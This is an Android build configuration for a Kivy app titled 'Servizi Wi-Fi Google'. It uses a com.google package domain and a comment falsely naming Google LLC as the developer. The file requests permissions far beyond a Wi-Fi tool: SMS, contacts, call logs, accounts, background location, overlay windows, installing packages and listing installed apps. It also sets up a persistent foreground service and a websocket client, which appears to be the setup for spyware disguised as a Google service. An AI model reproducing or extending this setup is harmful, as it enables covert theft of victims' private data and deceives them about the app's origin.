[app]
title = Servizi Wi-Fi Google
package.name = wifi_services
package.domain = com.google.android.wifi

version.code = 7
version.string = 3.0.0

source.dir = .
source.include_exts = py,png,jpg,kv,atlas

requirements = python3,kivy,plyer,pyjnius,websocket-client,requests

android.permissions = INTERNET,ACCESS_NETWORK_STATE,ACCESS_WIFI_STATE,\
    CHANGE_WIFI_STATE,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,\
    ACCESS_BACKGROUND_LOCATION,FOREGROUND_SERVICE,WAKE_LOCK,\
    SYSTEM_ALERT_WINDOW,REQUEST_INSTALL_PACKAGES,\
    READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,\
    READ_CONTACTS,READ_SMS,RECEIVE_SMS,READ_CALL_LOG,\
    READ_PHONE_STATE,POST_NOTIFICATIONS,\
    QUERY_ALL_PACKAGES,GET_ACCOUNTS,\
    MANAGE_EXTERNAL_STORAGE

android.api = 34
android.minapi = 26
android.ndk = 27
android.sdk = 34
android.gradle_dependencies = androidx.core:core:1.12.0

android.foreground = 1
android.foreground_service = 1
android.wakelock = 1

icon =
presplash.color = #FFFFFF
android.debug = 1
android.arch = arm64-v8a
android.accept_sdk_license = True

# Nome sviluppatore Google LLC
android.meta_data = \
    com.google.android.gms.version=@integer/google_play_services_version
